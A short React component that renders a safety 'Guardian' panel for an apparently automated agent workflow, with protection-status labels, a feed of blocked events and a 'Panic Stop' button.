function GuardianPanel(props: { guardianStatus: any; safety: any[]; runId: string; panic: () => void }) {
  const events = asArray(props.guardianStatus?.events);
  return <div className="guardian-detail-grid">
    <div className="glass-panel"><PanelTitle eyebrow="Protection level" title="Protected" /><p>{props.guardianStatus?.summary || 'Guardian is watching for secrets, risky actions, unsafe paste/send, shell/file risk, and workflow replay risk.'}</p><div className="guardian-grid"><span>Approval required</span><span>Blocked by default</span><span>Watching for secrets</span><span>Local-first mode active</span><span>Paste/send policy active</span><span>Shell/file risk policy active</span></div><button className="danger-button" onClick={props.panic} disabled={!props.runId}>Panic Stop</button></div>
    <div className="glass-panel"><PanelTitle eyebrow="Recent blocked/actions" title={`${events.length + props.safety.length} signals`} /><Feed items={(events.length ? events : props.safety.slice(-8)).map((event: any) => ({ title: event.summary || event.message || event.kind || event.type || 'Guardian event', detail: event.explanation || event.action || event.step_id || event.risk || 'Protection state updated.' }))} /></div>
  </div>;
}
